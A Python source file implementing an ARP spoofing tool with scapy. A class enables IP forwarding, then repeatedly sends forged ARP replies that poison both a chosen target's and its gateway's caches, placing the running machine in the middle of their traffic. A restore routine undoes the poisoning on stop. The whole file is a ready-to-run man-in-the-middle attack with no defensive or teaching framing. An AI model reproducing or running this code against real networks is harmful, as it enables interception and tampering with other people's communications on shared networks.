import subprocess
import threading
import time

from scapy.all import ARP, Ether, conf, getmacbyip, sendp


class ArpSpoof:
    def __init__(self) -> None:
        self._running = False
        self._thread: threading.Thread | None = None
        self._iface = ""
        self._target_ip = ""
        self._gateway_ip = ""
        self._target_mac = ""
        self._gateway_mac = ""

    @property
    def running(self) -> bool:
        return self._running

    def start(self, iface: str, target_ip: str, gateway_ip: str) -> None:
        conf.verb = 0
        self._iface = iface
        self._target_ip = target_ip
        self._gateway_ip = gateway_ip
        self._target_mac = getmacbyip(target_ip) or ""
        self._gateway_mac = getmacbyip(gateway_ip) or ""

        if not self._target_mac or not self._gateway_mac:
            raise ValueError(
                f"Cannot resolve MACs — target={self._target_mac or '?'} "
                f"gateway={self._gateway_mac or '?'}"
            )

        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)
        self._restore()

    def _loop(self) -> None:
        while self._running:
            # Tell target: gateway is at our MAC
            sendp(
                Ether(dst=self._target_mac)
                / ARP(op=2, pdst=self._target_ip, hwdst=self._target_mac,
                      psrc=self._gateway_ip),
                iface=self._iface, verbose=False,
            )
            # Tell gateway: target is at our MAC
            sendp(
                Ether(dst=self._gateway_mac)
                / ARP(op=2, pdst=self._gateway_ip, hwdst=self._gateway_mac,
                      psrc=self._target_ip),
                iface=self._iface, verbose=False,
            )
            time.sleep(1.5)

    def _restore(self) -> None:
        if not (self._target_mac and self._gateway_mac):
            return
        for _ in range(5):
            sendp(
                Ether(dst=self._target_mac)
                / ARP(op=2, pdst=self._target_ip, hwdst=self._target_mac,
                      psrc=self._gateway_ip, hwsrc=self._gateway_mac),
                iface=self._iface, verbose=False,
            )
            sendp(
                Ether(dst=self._gateway_mac)
                / ARP(op=2, pdst=self._gateway_ip, hwdst=self._gateway_mac,
                      psrc=self._target_ip, hwsrc=self._target_mac),
                iface=self._iface, verbose=False,
            )
            time.sleep(0.2)
